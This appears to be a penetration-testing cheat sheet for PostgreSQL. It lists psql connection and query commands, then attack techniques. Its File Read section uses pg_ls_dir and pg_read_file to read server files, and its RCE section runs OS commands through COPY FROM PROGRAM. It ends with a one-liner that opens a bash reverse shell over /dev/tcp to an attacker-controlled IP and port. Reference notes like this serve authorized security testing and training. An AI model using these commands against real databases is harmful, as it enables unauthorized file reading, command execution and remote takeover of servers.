---
title: "PostgreSQL"
date: 2025-7-25
tags: ["Database Dumping", "Privilege Escalation In Databases", "Postgresql", "RCE", "Database", "File Read"]
---

### Connect

```console
psql -h <TARGET> -U <USER>
```

```console
psql -h <TARGET> -U <USER> -p <PORT> -d <DB_NAME>
```

```console
psql 'postgresql://<USER>:<PASSWORD>@<TARGET>:5432/<DB_NAME>'
```

### General

```console
# Show databases
\list
```

```console
# Use database
\connect <DB_NAME>
```

```console
# Show tables
\dt
```

```console
# Disable pager
\pset pager 0
```

```console
# Dump from table
select * from "<TABLE_NAME>";
```

```console
# Insert into table
insert into "<TABLE_NAME>" (<COLUMN_1>, <COLUMN_2>) values ('<VALUE_1>', '<VALUE_2>');
```

```console
# Update table
update "<TABLE_NAME>" set <COLUMN_1> = '<VALUE_1>' where <COLUMN_2> = '<VALUE_2>';
```

```console
# Write text
copy (select '<STRING>') to '<TARGET_PATH>';
```

```console
# List all user accounts
\du+
```

```console
# Exit
\q
```

---

### File Read

```console
# List directory
SELECT * FROM pg_ls_dir('<DIR_PATH>');
``` 

```console
# File read
SELECT pg_read_file('<FILE_PATH>', 0, 4096);
```

---

### RCE

```console
# Only for superuser
CREATE TABLE IF NOT EXISTS exec(string text);
```

```console
# Code execution
COPY exec FROM PROGRAM '<CMD>';
```

```console
# Check ouput
SELECT * FROM exec;
```

```console
# One-liner
DO $$ DECLARE c text; BEGIN c := 'COPY (SELECT '''') to program ''bash -c "bash -i >& /dev/tcp/<LOCAL_IP>/<PORT> 0>&1"'''; EXECUTE c; END $$;
```